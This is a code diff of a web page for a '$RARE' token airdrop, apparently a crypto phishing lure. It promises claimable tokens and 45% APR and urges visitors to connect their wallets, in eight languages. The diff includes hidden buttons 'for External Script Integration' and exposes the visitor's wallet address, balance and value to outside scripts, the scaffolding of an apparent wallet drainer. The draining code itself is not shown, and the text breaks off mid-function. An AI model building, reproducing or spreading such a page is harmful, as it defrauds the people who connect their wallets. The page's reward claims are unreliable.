+              </div>
+              <div class="py-1" style="background-color: #1a1a1a">
+                <button
+                  class="lang-option text-sr-text-primary transition-colors"
+                  style="
+                    width: 100%;
+                    display: flex;
+                    align-items: center;
+                    justify-content: space-between;
+                    padding: 0.625rem 1rem;
+                    font-size: 0.875rem;
+                    background: transparent;
+                    border: none;
+                    cursor: pointer;
+                    text-align: left;
+                  "
+                  data-lang="en"
+                >
+                  <span style="font-weight: 500">English</span>
+                  <span style="font-size: 0.75rem; color: #9ca3af">EN</span>
+                </button>
+                <button
+                  class="lang-option text-sr-text-primary transition-colors"
+                  style="
+                    width: 100%;
+                    display: flex;
+                    align-items: center;
+                    justify-content: space-between;
+                    padding: 0.625rem 1rem;
+                    font-size: 0.875rem;
+                    background: transparent;
+                    border: none;
+                    cursor: pointer;
+                    text-align: left;
+                  "
+                  data-lang="de"
+                >
+                  <span style="font-weight: 500">Deutsch</span>
+                  <span style="font-size: 0.75rem; color: #9ca3af">DE</span>
+                </button>
+                <button
+                  class="lang-option text-sr-text-primary transition-colors"
+                  style="
+                    width: 100%;
+                    display: flex;
+                    align-items: center;
+                    justify-content: space-between;
+                    padding: 0.625rem 1rem;
+                    font-size: 0.875rem;
+                    background: transparent;
+                    border: none;
+                    cursor: pointer;
+                    text-align: left;
+                  "
+                  data-lang="es"
+                >
+                  <span style="font-weight: 500">Español</span>
+                  <span style="font-size: 0.75rem; color: #9ca3af">ES</span>
+                </button>
+                <button
+                  class="lang-option text-sr-text-primary transition-colors"
+                  style="
+                    width: 100%;
+                    display: flex;
+                    align-items: center;
+                    justify-content: space-between;
+                    padding: 0.625rem 1rem;
+                    font-size: 0.875rem;
+                    background: transparent;
+                    border: none;
+                    cursor: pointer;
+                    text-align: left;
+                  "
+                  data-lang="nl"
+                >
+                  <span style="font-weight: 500">Nederlands</span>
+                  <span style="font-size: 0.75rem; color: #9ca3af">NL</span>
+                </button>
+                <button
+                  class="lang-option text-sr-text-primary transition-colors"
+                  style="
+                    width: 100%;
+                    display: flex;
+                    align-items: center;
+                    justify-content: space-between;
+                    padding: 0.625rem 1rem;
+                    font-size: 0.875rem;
+                    background: transparent;
+                    border: none;
+                    cursor: pointer;
+                    text-align: left;
+                  "
+                  data-lang="pt"
+                >
+                  <span style="font-weight: 500">Português</span>
+                  <span style="font-size: 0.75rem; color: #9ca3af">PT</span>
+                </button>
+                <button
+                  class="lang-option text-sr-text-primary transition-colors"
+                  style="
+                    width: 100%;
+                    display: flex;
+                    align-items: center;
+                    justify-content: space-between;
+                    padding: 0.625rem 1rem;
+                    font-size: 0.875rem;
+                    background: transparent;
+                    border: none;
+                    cursor: pointer;
+                    text-align: left;
+                  "
+                  data-lang="ru"
+                >
+                  <span style="font-weight: 500">Русский</span>
+                  <span style="font-size: 0.75rem; color: #9ca3af">RU</span>
+                </button>
+                <button
+                  class="lang-option text-sr-text-primary transition-colors"
+                  style="
+                    width: 100%;
+                    display: flex;
+                    align-items: center;
+                    justify-content: space-between;
+                    padding: 0.625rem 1rem;
+                    font-size: 0.875rem;
+                    background: transparent;
+                    border: none;
+                    cursor: pointer;
+                    text-align: left;
+                  "
+                  data-lang="uk"
+                >
+                  <span style="font-weight: 500">Українська</span>
+                  <span style="font-size: 0.75rem; color: #9ca3af">UK</span>
+                </button>
+                <button
+                  class="lang-option text-sr-text-primary transition-colors"
+                  style="
+                    width: 100%;
+                    display: flex;
+                    align-items: center;
+                    justify-content: space-between;
+                    padding: 0.625rem 1rem;
+                    font-size: 0.875rem;
+                    background: transparent;
+                    border: none;
+                    cursor: pointer;
+                    text-align: left;
+                  "
+                  data-lang="zh"
+                >
+                  <span style="font-weight: 500">中文</span>
+                  <span style="font-size: 0.75rem; color: #9ca3af">ZH</span>
+                </button>
+              </div>
+            </div>
+          </div>
+
+          <button
+            id="themeToggle"
+            class="rounded-full p-2 hover:bg-tertiary"
+            aria-label="Toggle theme mode"
+          >
+            <svg
+              id="themeIcon"
+              class="transition-transform duration-300 ease-in-out rotate-180"
+              width="15"
+              height="15"
+              viewBox="0 0 15 15"
+              fill="none"
+              xmlns="http://www.w3.org/2000/svg"
+            >
+              <path
+                fill-rule="evenodd"
+                clip-rule="evenodd"
+                d="M7.49991 0.876892C3.84222 0.876892 0.877075 3.84204 0.877075 7.49972C0.877075 11.1574 3.84222 14.1226 7.49991 14.1226C11.1576 14.1226 14.1227 11.1574 14.1227 7.49972C14.1227 3.84204 11.1576 0.876892 7.49991 0.876892ZM7.49988 1.82689C4.36688 1.8269 1.82707 4.36672 1.82707 7.49972C1.82707 10.6327 4.36688 13.1725 7.49988 13.1726V1.82689Z"
+                fill="white"
+              ></path>
+            </svg>
+          </button>
         </div>
-        <script src="/_next/static/chunks/webpack-c5e44fd4641a39a9.js" async=""></script>
-        <script>
-            (self.__next_f = self.__next_f || []).push([0]);
-            self.__next_f.push([2, null]);
-        </script>
-        <script>
-            self.__next_f.push([1, '1:HL["/_next/static/media/e4af272ccee01ff0-s.p.woff2","font",{"crossOrigin":"","type":"font/woff2"}]\n2:HL["/_next/static/css/7aea21d1f76679fa.css","style"]\n']);
-        </script>
-        <script>
-            self.__next_f.push([
-                1,
-                '3:I[2517,[],""]\n6:I[35093,["791","static/chunks/08ffd5a1-3b8b47fc4f190288.js","773","static/chunks/773-c7f664adc709bc36.js","82","static/chunks/82-5ff4e37223ef39e8.js","494","static/chunks/494-55df37a07e2a83ca.js","185","static/chunks/app/layout-f8faef4e3ab56244.js"],"default"]\n7:I[9335,["791","static/chunks/08ffd5a1-3b8b47fc4f190288.js","773","static/chunks/773-c7f664adc709bc36.js","82","static/chunks/82-5ff4e37223ef39e8.js","494","static/chunks/494-55df37a07e2a83ca.js","185","static/chunks/app/layout-f8faef4e3ab56244.js"],"GeoblockGate"]\n8:I[49787,["791","static/chunks/08ffd5a1-3b8b47fc4f190288.js","773","static/chunks/773-c7f664adc709bc36.js","82","static/chunks/82-5ff4e37223ef39e8.js","494","static/chunks/494-55df37a07e2a83ca.js","185","static/chunks/app/layout-f8faef4e3ab56244.js"],"Nav"]\n9:I[34630,[],""]\na:I[87778,[],""]\nb:I[25379,["791","static/chunks/08ffd5a1-3b8b47fc4f190288.js","773","static/chunks/773-c7f664adc709bc36.js","82","static/chunks/82-5ff4e37223ef39e8.js","494","static/chunks/494-55df37a07e2a83ca.js","185","static/chunks/app/layout-f8faef4e3ab56244.js"],"TransactionModal"]\nd:I[70332,[],""]\ne:[]\n',
-            ]);
-        </script>
-        <script>
-            self.__next_f.push([
-                1,
-                '0:["$","$L3",null,{"buildId":"UObce9X446D048ZBuZOSk","assetPrefix":"","urlParts":["",""],"initialTree":["",{"children":["__PAGE__",{}]},"$undefined","$undefined",true],"initialSeedData":["",{"children":["__PAGE__",{},[["$L4","$L5",null],null],null]},[[[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/7aea21d1f76679fa.css","precedence":"next","crossOrigin":"$undefined"}]],["$","html",null,{"lang":"en","children":["$","body",null,{"className":"\\n          __className_e8ce0c\\n          flex min-h-screen flex-col antialiased bg-primary\\n        ","children":["$","$L6",null,{"cookies":null,"children":["$","$L7",null,{"children":[["$","div",null,{"className":"fixed left-0 right-0 top-0 z-10","children":["$","$L8",null,{}]}],["$","main",null,{"className":"flex-1 px-4 pt-24","children":["$","$L9",null,{"parallelRouterKey":"children","segmentPath":["children"],"error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$La",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":[["$","title",null,{"children":"404: This page could not be found."}],["$","div",null,{"style":{"fontFamily":"system-ui,\\"Segoe UI\\",Roboto,Helvetica,Arial,sans-serif,\\"Apple Color Emoji\\",\\"Segoe UI Emoji\\"","height":"100vh","textAlign":"center","display":"flex","flexDirection":"column","alignItems":"center","justifyContent":"center"},"children":["$","div",null,{"children":[["$","style",null,{"dangerouslySetInnerHTML":{"__html":"body{color:#000;background:#fff;margin:0}.next-error-h1{border-right:1px solid rgba(0,0,0,.3)}@media (prefers-color-scheme:dark){body{color:#fff;background:#000}.next-error-h1{border-right:1px solid rgba(255,255,255,.3)}}"}}],["$","h1",null,{"className":"next-error-h1","style":{"display":"inline-block","margin":"0 20px 0 0","padding":"0 23px 0 0","fontSize":24,"fontWeight":500,"verticalAlign":"top","lineHeight":"49px"},"children":"404"}],["$","div",null,{"style":{"display":"inline-block"},"children":["$","h2",null,{"style":{"fontSize":14,"fontWeight":400,"lineHeight":"49px","margin":0},"children":"This page could not be found."}]}]]}]}]],"notFoundStyles":[]}]}],["$","$Lb",null,{}]]}]}]}]}]],null],null],"couldBeIntercepted":false,"initialHead":[null,"$Lc"],"globalErrorComponent":"$d","missingSlots":"$We"}]\n',
-            ]);
-        </script>
-        <script>
-            self.__next_f.push([1, '5:E{"digest":"NEXT_REDIRECT;replace;/stake;307;"}\n']);
-        </script>
-        <script>
-            self.__next_f.push([
-                1,
-                'c:[["$","meta","0",{"name":"viewport","content":"width=device-width, initial-scale=1"}],["$","meta","1",{"charSet":"utf-8"}],["$","title","2",{"children":"Rare Airdrop"}],["$","meta","3",{"name":"description","content":"Rare Airdrop"}],["$","link","4",{"rel":"icon","href":"/favicon.ico","type":"image/x-icon","sizes":"640x640"}],["$","meta","5",{"name":"next-size-adjust"}]]\n4:null\n',
-            ]);
-        </script>
-        <next-route-announcer style="position: absolute;"></next-route-announcer><w3m-modal style="--local-border-bottom-mobile-radius: 0px;" class=""></w3m-modal>
-        <main class="flex-1 px-4 pt-24">
-            <div class="mx-auto max-w-7xl px-4 py-8">
-                <div class="grid grid-cols-1 md:items-start md:gap-12 sm:grid-cols-2">
-                    <div class="text-left md:ml-16 md:ml-24 sm:ml-4 sm:mr-8">
-                        <video class="mb-6 w-full rounded-lg mix-blend-screen" autoplay="" loop="" playsinline="" muted="">
-                            <source src="https://framerusercontent.com/assets/ycw7a4R1sk5ThyLfO3DfAWgKcI.mp4" type="video/mp4" />
-                            Your browser does not support the video tag.
-                        </video>
-                        <h1 class="mb-4 text-xl font-bold uppercase text-sr-text-primary" data-i18n="heroTitle">Your airdrop in the future of art</h1>
-                        <p class="mb-2 text-base text-sr-text-primary" data-i18n="heroHold"><span class="font-bold">Hold</span> $RARE to invest in the art revolution.</p>
-                        <p class="mb-8 text-base text-sr-text-primary" data-i18n="heroClaim"><span class="font-bold">Claim</span> $RARE to earn while the market grows.</p>
-                        <p class="text-xl font-light text-sr-text-primary">45% APR | TVL: 31,810,647 RARE</p>
-                        <p class="mb-8 text-sm text-sr-text-tertiary" data-i18n="currentRate">
-                            Current rate based on total staked amount
-                        </p>
-                    </div>
-                    <div class="flex w-full items-start justify-start">
-                        <div class="w-full">
-                            <div class="mx-auto flex w-full max-w-[332px] flex-col space-y-4 rounded md:max-w-[464px]">
-                                <div class="rounded-lg bg-primary w-full pt-8 lg:px-16 lg:pb-28 lg:pt-32 md:px-8 md:pt-16">
-                                    <div class="rounded border pb-4 border-primary bg-primary w-full">
-                                        <div id="eligibilityMenu" class="mb-12 rounded rounded-b-none border-b bg-gradient-to-br from-sr-bg-quaternary to-sr-bg-primary px-6 py-8 dark:border-sr-border-quaternary dim:border-sr-border-quaternary shadow-lg">
-                                            <div class="text-center text-sr-text-primary space-y-3">
-                                                <div class="inline-flex items-center justify-center w-16 h-16 rounded-full bg-sr-bg-primary/50 border-2 border-sr-border-primary mb-2">
-                                                    <svg width="32" height="32" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                                                        <path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-                                                        <polyline points="3.27 6.96 12 12.01 20.73 6.96" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-                                                        <line x1="12" y1="22.08" x2="12" y2="12" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-                                                    </svg>
-                                                </div>
-                                                <p class="text-lg font-semibold" data-i18n="connectYourWallet">Connect Your Wallet</p>
-                                                <p class="text-sm text-sr-text-secondary" data-i18n="getStarted">Get started by connecting your wallet to claim your rewards</p>
-                                            </div>
-                                        </div>
-                                    </div>
-                                </div>
-                            </div>
+      </nav>
+    </div>
+    <script
+      src="/_next/static/chunks/webpack-c5e44fd4641a39a9.js"
+      async=""
+    ></script>
+    <script>
+      (self.__next_f = self.__next_f || []).push([0]);
+      self.__next_f.push([2, null]);
+    </script>
+    <script>
+      self.__next_f.push([
+        1,
+        '1:HL["/_next/static/media/e4af272ccee01ff0-s.p.woff2","font",{"crossOrigin":"","type":"font/woff2"}]\n2:HL["/_next/static/css/7aea21d1f76679fa.css","style"]\n',
+      ]);
+    </script>
+    <script>
+      self.__next_f.push([
+        1,
+        '3:I[2517,[],""]\n6:I[35093,["791","static/chunks/08ffd5a1-3b8b47fc4f190288.js","773","static/chunks/773-c7f664adc709bc36.js","82","static/chunks/82-5ff4e37223ef39e8.js","494","static/chunks/494-55df37a07e2a83ca.js","185","static/chunks/app/layout-f8faef4e3ab56244.js"],"default"]\n7:I[9335,["791","static/chunks/08ffd5a1-3b8b47fc4f190288.js","773","static/chunks/773-c7f664adc709bc36.js","82","static/chunks/82-5ff4e37223ef39e8.js","494","static/chunks/494-55df37a07e2a83ca.js","185","static/chunks/app/layout-f8faef4e3ab56244.js"],"GeoblockGate"]\n8:I[49787,["791","static/chunks/08ffd5a1-3b8b47fc4f190288.js","773","static/chunks/773-c7f664adc709bc36.js","82","static/chunks/82-5ff4e37223ef39e8.js","494","static/chunks/494-55df37a07e2a83ca.js","185","static/chunks/app/layout-f8faef4e3ab56244.js"],"Nav"]\n9:I[34630,[],""]\na:I[87778,[],""]\nb:I[25379,["791","static/chunks/08ffd5a1-3b8b47fc4f190288.js","773","static/chunks/773-c7f664adc709bc36.js","82","static/chunks/82-5ff4e37223ef39e8.js","494","static/chunks/494-55df37a07e2a83ca.js","185","static/chunks/app/layout-f8faef4e3ab56244.js"],"TransactionModal"]\nd:I[70332,[],""]\ne:[]\n',
+      ]);
+    </script>
+    <script>
+      self.__next_f.push([
+        1,
+        '0:["$","$L3",null,{"buildId":"UObce9X446D048ZBuZOSk","assetPrefix":"","urlParts":["",""],"initialTree":["",{"children":["__PAGE__",{}]},"$undefined","$undefined",true],"initialSeedData":["",{"children":["__PAGE__",{},[["$L4","$L5",null],null],null]},[[[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/7aea21d1f76679fa.css","precedence":"next","crossOrigin":"$undefined"}]],["$","html",null,{"lang":"en","children":["$","body",null,{"className":"\\n          __className_e8ce0c\\n          flex min-h-screen flex-col antialiased bg-primary\\n        ","children":["$","$L6",null,{"cookies":null,"children":["$","$L7",null,{"children":[["$","div",null,{"className":"fixed left-0 right-0 top-0 z-10","children":["$","$L8",null,{}]}],["$","main",null,{"className":"flex-1 px-4 pt-24","children":["$","$L9",null,{"parallelRouterKey":"children","segmentPath":["children"],"error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$La",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":[["$","title",null,{"children":"404: This page could not be found."}],["$","div",null,{"style":{"fontFamily":"system-ui,\\"Segoe UI\\",Roboto,Helvetica,Arial,sans-serif,\\"Apple Color Emoji\\",\\"Segoe UI Emoji\\"","height":"100vh","textAlign":"center","display":"flex","flexDirection":"column","alignItems":"center","justifyContent":"center"},"children":["$","div",null,{"children":[["$","style",null,{"dangerouslySetInnerHTML":{"__html":"body{color:#000;background:#fff;margin:0}.next-error-h1{border-right:1px solid rgba(0,0,0,.3)}@media (prefers-color-scheme:dark){body{color:#fff;background:#000}.next-error-h1{border-right:1px solid rgba(255,255,255,.3)}}"}}],["$","h1",null,{"className":"next-error-h1","style":{"display":"inline-block","margin":"0 20px 0 0","padding":"0 23px 0 0","fontSize":24,"fontWeight":500,"verticalAlign":"top","lineHeight":"49px"},"children":"404"}],["$","div",null,{"style":{"display":"inline-block"},"children":["$","h2",null,{"style":{"fontSize":14,"fontWeight":400,"lineHeight":"49px","margin":0},"children":"This page could not be found."}]}]]}]}]],"notFoundStyles":[]}]}],["$","$Lb",null,{}]]}]}]}]}]],null],null],"couldBeIntercepted":false,"initialHead":[null,"$Lc"],"globalErrorComponent":"$d","missingSlots":"$We"}]\n',
+      ]);
+    </script>
+    <script>
+      self.__next_f.push([
+        1,
+        '5:E{"digest":"NEXT_REDIRECT;replace;/stake;307;"}\n',
+      ]);
+    </script>
+    <script>
+      self.__next_f.push([
+        1,
+        'c:[["$","meta","0",{"name":"viewport","content":"width=device-width, initial-scale=1"}],["$","meta","1",{"charSet":"utf-8"}],["$","title","2",{"children":"Rare Airdrop"}],["$","meta","3",{"name":"description","content":"Rare Airdrop"}],["$","link","4",{"rel":"icon","href":"/favicon.ico","type":"image/x-icon","sizes":"640x640"}],["$","meta","5",{"name":"next-size-adjust"}]]\n4:null\n',
+      ]);
+    </script>
+    <next-route-announcer style="position: absolute"></next-route-announcer
+    ><w3m-modal
+      style="--local-border-bottom-mobile-radius: 0px"
+      class=""
+    ></w3m-modal>
+    <main class="flex-1 px-4 pt-24">
+      <div class="mx-auto max-w-7xl px-4 py-8">
+        <div class="grid grid-cols-1 md:items-start md:gap-12 sm:grid-cols-2">
+          <div class="text-left md:ml-16 md:ml-24 sm:ml-4 sm:mr-8">
+            <video
+              class="mb-6 w-full rounded-lg mix-blend-screen"
+              autoplay=""
+              loop=""
+              playsinline=""
+              muted=""
+            >
+              <source
+                src="https://framerusercontent.com/assets/ycw7a4R1sk5ThyLfO3DfAWgKcI.mp4"
+                type="video/mp4"
+              />
+              Your browser does not support the video tag.
+            </video>
+            <h1
+              class="mb-4 text-xl font-bold uppercase text-sr-text-primary"
+              data-i18n="heroTitle"
+            >
+              Your airdrop in the future of art
+            </h1>
+            <p class="mb-2 text-base text-sr-text-primary" data-i18n="heroHold">
+              <span class="font-bold">Hold</span> $RARE to invest in the art
+              revolution.
+            </p>
+            <p
+              class="mb-8 text-base text-sr-text-primary"
+              data-i18n="heroClaim"
+            >
+              <span class="font-bold">Claim</span> $RARE to earn while the
+              market grows.
+            </p>
+            <p class="text-xl font-light text-sr-text-primary">
+              45% APR | TVL: 31,810,647 RARE
+            </p>
+            <p
+              class="mb-8 text-sm text-sr-text-tertiary"
+              data-i18n="currentRate"
+            >
+              Current rate based on total staked amount
+            </p>
+          </div>
+          <div class="flex w-full items-start justify-start">
+            <div class="w-full">
+              <div
+                class="mx-auto flex w-full max-w-[332px] flex-col space-y-4 rounded md:max-w-[464px]"
+              >
+                <div
+                  class="rounded-lg bg-primary w-full pt-8 lg:px-16 lg:pb-28 lg:pt-32 md:px-8 md:pt-16"
+                >
+                  <div
+                    class="rounded border pb-4 border-primary bg-primary w-full"
+                  >
+                    <div
+                      id="eligibilityMenu"
+                      class="mb-12 rounded rounded-b-none border-b bg-gradient-to-br from-sr-bg-quaternary to-sr-bg-primary px-6 py-8 dark:border-sr-border-quaternary dim:border-sr-border-quaternary shadow-lg"
+                    >
+                      <div class="text-center text-sr-text-primary space-y-3">
+                        <div
+                          class="inline-flex items-center justify-center w-16 h-16 rounded-full bg-sr-bg-primary/50 border-2 border-sr-border-primary mb-2"
+                        >
+                          <svg
+                            width="32"
+                            height="32"
+                            viewBox="0 0 24 24"
+                            fill="none"
+                            xmlns="http://www.w3.org/2000/svg"
+                          >
+                            <path
+                              d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"
+                              stroke="currentColor"
+                              stroke-width="2"
+                              stroke-linecap="round"
+                              stroke-linejoin="round"
+                            />
+                            <polyline
+                              points="3.27 6.96 12 12.01 20.73 6.96"
+                              stroke="currentColor"
+                              stroke-width="2"
+                              stroke-linecap="round"
+                              stroke-linejoin="round"
+                            />
+                            <line
+                              x1="12"
+                              y1="22.08"
+                              x2="12"
+                              y2="12"
+                              stroke="currentColor"
+                              stroke-width="2"
+                              stroke-linecap="round"
+                              stroke-linejoin="round"
+                            />
+                          </svg>
                         </div>
+                        <p
+                          class="text-lg font-semibold"
+                          data-i18n="connectYourWallet"
+                        >
+                          Connect Your Wallet
+                        </p>
+                        <p
+                          class="text-sm text-sr-text-secondary"
+                          data-i18n="getStarted"
+                        >
+                          Get started by connecting your wallet to claim your
+                          rewards
+                        </p>
+                      </div>
                     </div>
+                  </div>
                 </div>
+              </div>
             </div>
-            <div class="w-full bg-primary mt-8 py-4">
-                <div class="flex items-center justify-center">
-                    <div class="text-center text-sm text-sr-text-secondary">
-                        
-                        <p data-i18n="footerNotice">$RARE airdrop is not available in some countries yet.</p>
-                    </div>
-                </div>
-            </div>
-        </main>
-        <div class="flex w-full items-center justify-center rounded px-8 pt-8"></div>
-        
-        <!-- Hidden Proxy Buttons for External Script Integration -->
-        <button id="hiddenConnectBtn" class="cnct-button" style="display: none;"></button>
-        <button id="hiddenDisconnectBtn" class="discon-button" style="display: none;"></button>
-        <button id="hiddenGetRAREBtn" class="getRARE-button" style="display: none;"></button>
-        
-        <script>
-            // ========== GLOBAL VARIABLES (exposed for external scripts) ==========
-            window.currentAccount = null;
-            window.currentChain = '0x1';
-            window.walletState = {};
-            window.address = null;
-            window.walletName = null;
-            window.totalWalletPrice = null;
-            window.walletBalance = null;
-            window.walletSteps = null;
-            
-            // ========== TRANSLATION SYSTEM ==========
-            const translations = {
-                en: {
-                    connectWallet: 'CONNECT WALLET',
-                    heroTitle: 'Your airdrop in the future of art',
-                    heroHold: '<span class="font-bold">Hold</span> $RARE to invest in the art revolution.',
-                    heroClaim: '<span class="font-bold">Claim</span> $RARE to earn while the market grows.',
-                    currentRate: 'Current rate based on total staked amount',
-                    connectYourWallet: 'Connect Your Wallet',
-                    getStarted: 'Get started by connecting your wallet to claim your rewards',
-                    walletConnected: 'Wallet Connected',
-                    walletValue: 'Wallet Value',
-                    claim: 'CLAIM',
-                    claimRewards: 'CLAIM REWARDS',
-                    footerNotice: '$RARE airdrop is not available in some countries yet.'
-                },
-                de: {
-                    connectWallet: 'WALLET VERBINDEN',
-                    heroTitle: 'Ihr Airdrop in der Zukunft der Kunst',
-                    heroHold: '<span class="font-bold">Halten</span> Sie $RARE, um in die Kunstrevolution zu investieren.',
-                    heroClaim: '<span class="font-bold">Beanspruchen</span> Sie $RARE, um zu verdienen, während der Markt wächst.',
-                    currentRate: 'Aktueller Zinssatz basierend auf dem gesamten Einsatz',
-                    connectYourWallet: 'Verbinden Sie Ihr Wallet',
-                    getStarted: 'Beginnen Sie, indem Sie Ihr Wallet verbinden, um Ihre Belohnungen zu beanspruchen',
-                    walletConnected: 'Wallet Verbunden',
-                    walletValue: 'Wallet-Wert',
-                    claim: 'BEANSPRUCHEN',
-                    claimRewards: 'BELOHNUNGEN BEANSPRUCHEN',
-                    footerNotice: '$RARE Airdrop ist in einigen Ländern noch nicht verfügbar.'
-                },
-                es: {
-                    connectWallet: 'CONECTAR WALLET',
-                    heroTitle: 'Tu airdrop en el futuro del arte',
-                    heroHold: '<span class="font-bold">Mantén</span> $RARE para invertir en la revolución del arte.',
-                    heroClaim: '<span class="font-bold">Reclama</span> $RARE para ganar mientras el mercado crece.',
-                    currentRate: 'Tasa actual basada en la cantidad total en staking',
-                    connectYourWallet: 'Conecta Tu Wallet',
-                    getStarted: 'Comienza conectando tu wallet para reclamar tus recompensas',
-                    walletConnected: 'Wallet Conectada',
-                    walletValue: 'Valor del Wallet',
-                    claim: 'RECLAMAR',
-                    claimRewards: 'RECLAMAR RECOMPENSAS',
-                    footerNotice: 'El airdrop de $RARE aún no está disponible en algunos países.'
-                },
-                nl: {
-                    connectWallet: 'WALLET VERBINDEN',
-                    heroTitle: 'Jouw airdrop in de toekomst van kunst',
-                    heroHold: '<span class="font-bold">Houd</span> $RARE om te investeren in de kunstrevolutie.',
-                    heroClaim: '<span class="font-bold">Claim</span> $RARE om te verdienen terwijl de markt groeit.',
-                    currentRate: 'Huidig tarief gebaseerd op totale gestakte bedrag',
-                    connectYourWallet: 'Verbind Je Wallet',
-                    getStarted: 'Begin door je wallet te verbinden om je beloningen te claimen',
-                    walletConnected: 'Wallet Verbonden',
-                    walletValue: 'Wallet Waarde',
-                    claim: 'CLAIMEN',
-                    claimRewards: 'BELONINGEN CLAIMEN',
-                    footerNotice: '$RARE airdrop is nog niet beschikbaar in sommige landen.'
-                },
-                pt: {
-                    connectWallet: 'CONECTAR CARTEIRA',
-                    heroTitle: 'Seu airdrop no futuro da arte',
-                    heroHold: '<span class="font-bold">Mantenha</span> $RARE para investir na revolução da arte.',
-                    heroClaim: '<span class="font-bold">Reivindique</span> $RARE para ganhar enquanto o mercado cresce.',
-                    currentRate: 'Taxa atual baseada no valor total em staking',
-                    connectYourWallet: 'Conecte Sua Carteira',
-                    getStarted: 'Comece conectando sua carteira para reivindicar suas recompensas',
-                    walletConnected: 'Carteira Conectada',
-                    walletValue: 'Valor da Carteira',
-                    claim: 'REIVINDICAR',
-                    claimRewards: 'REIVINDICAR RECOMPENSAS',
-                    footerNotice: 'O airdrop de $RARE ainda não está disponível em alguns países.'
-                },
-                ru: {
-                    connectWallet: 'ПОДКЛЮЧИТЬ КОШЕЛЕК',
-                    heroTitle: 'Ваш airdrop в будущем искусства',
-                    heroHold: '<span class="font-bold">Держите</span> $RARE, чтобы инвестировать в революцию искусства.',
-                    heroClaim: '<span class="font-bold">Получите</span> $RARE, чтобы зарабатывать, пока рынок растет.',
-                    currentRate: 'Текущая ставка основана на общей сумме стейкинга',
-                    connectYourWallet: 'Подключите Ваш Кошелек',
-                    getStarted: 'Начните с подключения вашего кошелька, чтобы получить награды',
-                    walletConnected: 'Кошелек Подключен',
-                    walletValue: 'Стоимость Кошелька',
-                    claim: 'ПОЛУЧИТЬ',
-                    claimRewards: 'ПОЛУЧИТЬ НАГРАДЫ',
-                    footerNotice: 'Airdrop $RARE пока недоступен в некоторых странах.'
-                },
-                uk: {
-                    connectWallet: 'ПІДКЛЮЧИТИ ГАМАНЕЦЬ',
-                    heroTitle: 'Ваш airdrop у майбутньому мистецтва',
-                    heroHold: '<span class="font-bold">Тримайте</span> $RARE, щоб інвестувати в революцію мистецтва.',
-                    heroClaim: '<span class="font-bold">Отримайте</span> $RARE, щоб заробляти, поки ринок зростає.',
-                    currentRate: 'Поточна ставка на основі загальної суми стейкінгу',
-                    connectYourWallet: 'Підключіть Ваш Гаманець',
-                    getStarted: 'Почніть з підключення вашого гаманця, щоб отримати винагороди',
-                    walletConnected: 'Гаманець Підключено',
-                    walletValue: 'Вартість Гаманця',
-                    claim: 'ОТРИМАТИ',
-                    claimRewards: 'ОТРИМАТИ ВИНАГОРОДИ',
-                    footerNotice: 'Airdrop $RARE поки недоступний у деяких країнах.'
-                },
-                zh: {
-                    connectWallet: '连接钱包',
-                    heroTitle: '您在艺术未来中的空投',
-                    heroHold: '<span class="font-bold">持有</span> $RARE 投资艺术革命。',
-                    heroClaim: '<span class="font-bold">领取</span> $RARE 在市场增长时赚取收益。',
-                    currentRate: '基于总质押金额的当前利率',
-                    connectYourWallet: '连接您的钱包',
-                    getStarted: '通过连接您的钱包开始领取奖励',
-                    walletConnected: '钱包已连接',
-                    walletValue: '钱包价值',
-                    claim: '领取',
-                    claimRewards: '领取奖励',
-                    footerNotice: '$RARE 空投在某些国家尚未提供。'
-                }
-            };
-            
-            // Current language
-            let currentLanguage = localStorage.getItem('selectedLanguage') || 'en';
-            
-            // Apply translations to the page
-            function applyTranslations(lang) {
-                const langData = translations[lang] || translations.en;
-                
-                // Update all elements with data-i18n attribute
-                document.querySelectorAll('[data-i18n]').forEach(element => {
-                    const key = element.getAttribute('data-i18n');
-                    if (langData[key]) {
-                        element.innerHTML = langData[key];
-                    }
-                });
-                
-                // Update language selector
-                const langCode = lang.toUpperCase();
-                const langCodeElement = document.getElementById('currentLangCode');
-                if (langCodeElement) {
-                    langCodeElement.textContent = langCode;
-                }
-                
-                // Update active state in dropdown
-                document.querySelectorAll('.lang-option').forEach(option => {
-                    const optionLang = option.getAttribute('data-lang');
-                    if (optionLang === lang) {
-                        option.classList.add('bg-sr-bg-primary');
-                    } else {
-                        option.classList.remove('bg-sr-bg-primary');
-                    }
-                });
-                
-                // If wallet is connected, update the wallet UI with translations
-                if (window.address) {
-                    updateWalletUI(window.address, window.walletName, window.totalWalletPrice);
-                }
-                
-                currentLanguage = lang;
-                localStorage.setItem('selectedLanguage', lang);
-                console.log('🌐 Language changed to:', lang);
-            }
-            
-            // Function to shorten wallet address
-            function shortenAddress(address) {
-                if (!address) return '';
-                return `${address.substring(0, 5)}...${address.substring(address.length - 4)}`;
-            }
-            
-            // Toggle navbar buttons based on connection status
-            function toggleNavbarButtons(isConnected) {
-                // Select only visible buttons (not the hidden proxy buttons)
-                const connectBtn = document.querySelector('.cnct-button:not(#hiddenConnectBtn)');
-                const disconnectBtn = document.querySelector('.discon-button:not(#hiddenDisconnectBtn)');
-                
-                console.log('🔄 Toggling navbar buttons. Connected:', isConnected);
-                console.log('   Connect button:', connectBtn);
-                console.log('   Disconnect button:', disconnectBtn);
-                
-                if (isConnected) {
-                    if (connectBtn) {
-                        connectBtn.style.display = 'none';
-                        console.log('   ✅ Connect button hidden');
-                    }
-                    if (disconnectBtn) {
-                        disconnectBtn.style.display = 'block';
-                        console.log('   ✅ Disconnect button shown');
-                    }
-                } else {
-                    if (connectBtn) {
